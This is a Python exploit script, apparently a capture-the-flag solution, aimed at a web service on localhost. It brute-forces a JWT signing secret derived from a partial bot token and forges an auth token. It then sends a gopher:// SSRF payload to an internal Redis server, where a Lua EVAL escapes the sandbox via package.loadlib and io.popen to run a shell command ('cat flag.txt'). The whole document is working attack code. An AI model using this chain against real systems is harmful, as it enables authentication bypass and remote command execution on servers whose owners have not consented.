import json
from string import ascii_letters, digits
from urllib.parse import quote
import requests
import jwt
import sys

url = "http://localhost:27294/ping"

tg_bot_token = "7726687396:"

alph = ascii_letters+digits
jwt_secret = None
auth_token = None
for c in alph:
    jwt_secret_try = tg_bot_token + c
    auth_token_try = jwt.encode({"user_id": 123}, jwt_secret_try, algorithm="HS256")

    resp = requests.post(url, headers={"Authorization": auth_token_try})
    if resp.status_code != 401:
        jwt_secret = jwt_secret_try
        auth_token = auth_token_try
        print("FOUND JWT SECRET:", jwt_secret)
        print("FOUND AUTH TOKEN:", auth_token)
        break


if jwt_secret is None or auth_token is None:
    print("No JWT secret and auth token found")
    sys.exit(1)

exploit = "cat flag.txt"

redis_cmd = f"""
auth redis
eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"{exploit}\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0
quit
"""

redis_cmd_encoded = redis_cmd.replace('\r','').replace('\n','%0D%0A').replace(' ','%20')
payload = json.dumps({
    # "url": f"gopher://127.0.0.1:6379/_{redis_cmd_encoded}"
    "url": f"gopher://127.0.0.1:6379/_{redis_cmd_encoded}"
})

print("PAYLOAD:", payload)
resp = requests.post(url, data=payload, headers={"Authorization": auth_token, "Content-Type": "application/json"})
print("RESP:", resp.text)